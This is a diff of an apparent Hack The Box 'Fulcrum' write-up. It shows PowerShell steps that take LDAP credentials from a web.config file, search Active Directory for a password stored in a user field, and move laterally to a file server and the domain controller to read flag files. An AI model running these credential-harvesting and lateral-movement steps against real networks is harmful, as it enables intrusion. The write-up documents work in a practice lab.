@@ -236,7 +236,7 @@ After running the ps1 on the windows machine we get a PSSession!!! GG
 webserver\webuser
 ```
 
-Time to enumerate the f out of the machine xD
+Time to enumerate the f out of the machine :laughing:
 
 First we check what might be present on the network
 
@@ -256,37 +256,124 @@ Lets have a network map handy so we dont confuse stuff
 <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Network-Diagram.png"></kbd>
 
 
+Lets get back to the PSSession
+
+There is a user.txt 
+
+```
+> cat user.txt
+You need to go deeper!
+```
+ 
+Ofcourse :persevere:
+
+After doing some enum we find this :
+
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> cat web.config
+...
+<add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
+...
+<add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
+...
+```
+
+We have LDAP Creds!
+
+> Username : LDAP | Password : PasswordForSearching123!
+
+Lets test them out
+
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> $entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulc
+rum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher = new-object directoryservices.directorysearcher($entry);
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher.filter = "(objectClass=user)";
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher.findAll() | Select Path
+
+Path
+----
+LDAP://dc.fulcrum.local/CN=Bobby Tables,OU=People,DC=fulcrum,DC=local
+LDAP://dc.fulcrum.local/CN=LDAP Lookup,OU=People,DC=fulcrum,DC=local
+...
+```
+
+So we got a User BTables 
+
+For more information about the user, Here is a useful link http://bobby-tables.com/
+
+Getting More info about the user from LDAP:
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> $entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulc
+rum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher = new-object directoryservices.directorysearcher($entry);
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher.filter ="(&(objectClass=user)(Name=*Bob*))"
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher.findAll() | Select Path
+
+Path
+----
+LDAP://dc.fulcrum.local/CN=Bobby Tables,OU=People,DC=fulcrum,DC=local
 
 
-=>Testing LDAP Creds to get Btables
-------------------------------------------------
-if ($env:computername  -eq $env:userdomain) { echo " no AD domain" } else { echo "must be in AD"}
-no AD Domain
-------------------------------------------------
-$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
-$searcher = new-object directoryservices.directorysearcher($entry);
-$searcher.filter = "(objectClass=user)";
-$searcher.findAll() | Select Path
-------------------------------------------------
-$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
-$searcher = new-object directoryservices.directorysearcher($entry);
-$searcher.filter ="(&(objectClass=user)(Name=*Bob*))"
-$searcher.findAll() | Select Path
-$searcher.filter ="(objectClass=user)"
-$results = $searcher.findAll()
-foreach($result in $results) { $user = $result.GetDirectoryEntry(); $user | Select * }
-------------------------------------------------
+[192.168.1.41]: PS C:\inetpub\wwwroot> $searcher.filter ="(objectClass=user)"
+[192.168.1.41]: PS C:\inetpub\wwwroot> $results = $searcher.findAll()
+[192.168.1.41]: PS C:\inetpub\wwwroot> foreach($result in $results) { $user = $result.GetDirectoryEntry(); $user | Select * }
+objectClass           : {top, person, organizationalPerson, user}
+cn                    : {Bobby Tables}
+description           : {Has logon rights to the file server}
+distinguishedName     : {CN=Bobby Tables,OU=People,DC=fulcrum,DC=local}
+...
+info                  : {Password set to ++FileServerLogon12345++}
+...
+```
 
-=> Information about BTables User on the File Server
-BTables@fulcrum.local
-Username : BTables
-Password : ++FileServerLogon12345++
-Has logon rights to the file server
+We got Boobys Creds yo!
 
-=> GET USER.TXT
- Invoke-Command -Computername file.fulcrum.local -ScriptBlock {type C:\Users\BTables\Desktop\user.txt} -credential $cred
+> Username : BTables | Password : ++FileServerLogon12345++ 
 
-=> Issue commands on file server
+### User.txt
+
+We got BTables Creds, now we just gotta check if we can invoke commands on that machine
+
+```
+Invoke-Command -Computername file.fulcrum.local -ScriptBlock {whoami} -credential $cred
+```
+While Invoking it, it will ask for Credentials
+
+<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/BTables.PNG"></kbd>
+
+```
+> Invoke-Command -Computername file.fulcrum.local -ScriptBlock {whoami} -credential $cred
+fulcrum\btables
+```
+
+GET REKT!!
+We can now create a $session where it would store the creds, so that we dont have to always put in the username and the password
+```
+PS C:\inetpub\wwwroot> $session = New-PSSession –ComputerName file.fulcrum.local -credential $creds
+PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {whoami}
+fulcrum\btables
+```
+
+Lets see if it has user.txt
+
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {dir C:\Users\BTables\Desktop\}
+
+    Directory: C:\Users\BTables\Desktop
+Mode                LastWriteTime         Length Name                                       PSComputerName
+----                -------------         ------ ----                                       --------------
+-a----       04-10-2017     22:12             34 user.txt                                   file.fulcrum.local
+
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {type C:\Users\BTables\Desktop\user.txt}
+fce52521c8f872b514f037fada78daf4
+```
+**GL HF GG WP**
+
+Time to get root!
+
+-------------------------------------------------[ NOTES TO BE DELETED LATER ]-----------------------------------------
+
 $session = New-PSSession –ComputerName file.fulcrum.local -credential $creds
 
 
@@ -302,4 +389,5 @@ get domain admin creds
 Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke
 -Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}
 
+-------------------------------------------------[ END OF NOTES ]-----------------------------------------
 
